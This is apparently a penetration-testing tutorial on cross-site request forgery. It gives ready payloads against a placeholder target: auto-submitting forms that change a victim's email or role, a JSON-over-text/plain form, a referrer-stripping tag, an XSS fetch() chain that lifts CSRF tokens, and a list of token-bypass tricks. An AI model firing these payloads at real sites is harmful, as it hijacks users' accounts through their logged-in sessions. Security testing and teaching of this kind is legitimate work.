**CSRF** is an attack where a malicious website tricks a logged-in user's browser into sending an unintended request, which the server may mistake as legitimate because of the user's session cookies.

The main target is usually a state-changing request:

- Change email
- Change password
- Change settings
- Change role
- Transfer money

### Break / Test

Inspect the request:

```
POST /update_email.php
email=attacker@example.com
```

Look for:

- No CSRF token
- Static token
- Predictable token
- Weak validation

### Basic CSRF payload:

```
<form action="http://TARGET/update_email.php" method="POST">
<input type="hidden" name="email" value="attacker@example.com">
</form>

<script>
document.forms[0].submit();
</script>
```

Decode weak token:

```
echo 'YWRtaW4=' | base64 -d
```

Image-based trigger:

```
<img src="http://TARGET/update_role.php?role=staff&csrf_token=TOKEN"
     onmouseover="window.location=this.src">
```

## Advanced 

Modern browsers and frameworks make basic CSRF harder. Here's how you actually bypass it.

**1. JSON CSRF (Bypassing Content-Type checks)**  
If the API expects `application/json`, standard HTML forms won't work. You need to trick the server into parsing `text/plain` as JSON.

```
<form action="http://TARGET/api/update" method="POST" enctype="text/plain">
<input name='{"email":"attacker@example.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

_Note: This only works if the backend blindly parses `text/plain` as JSON (common in poorly configured APIs)._

**2. SameSite Cookie Bypass**  
If the session cookie is set to `SameSite=Lax` or `Strict`, the basic POST form won't send the cookie.

- **Lax Bypass:** Top-level navigation (e.g., `window.location = "http://TARGET/..."`) sends the cookie on GET requests. If the state-changing action accepts GET, you're in.
- **Strict Bypass:** Requires XSS or a subdomain takeover.

**3. Referer / Origin Check Bypass**  
Some apps check the `Referer` header. You can strip it:

```
<meta name="referrer" content="no-referrer">
```

Or host your payload on a subdomain of the target (if you find an open redirect or XSS there).

**4. Token Validation Bypass**  
Developers often mess up CSRF token checks. Try these:

- Remove the `csrf_token` parameter entirely.
- Send an empty token: `csrf_token=`
- Send a random token: `csrf_token=12345`
- Change the request method from POST to GET.
- Use a token from a different session (if the app doesn't tie the token to the user).

**5. XSS + CSRF Chaining**  
If you have XSS, you don't need CSRF. You can just use `fetch()` to grab the CSRF token from the page and send the authenticated request.

```
fetch('/update_email.php', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=attacker@example.com&csrf_token=' + document.querySelector('input[name="csrf_token"]').value
});
```

**6. Burp Suite PoC Generator (The Real-World Shortcut)**  
Don't write HTML by hand. Right-click the request in Burp → `Engagement tools` → `Generate CSRF PoC`. It builds the payload for you, including the auto-submit script.

---

**Key takeaway:** CSRF isn't dead. It's just harder. Always check the `SameSite` attribute first. If it's not `Strict`, you have a path.
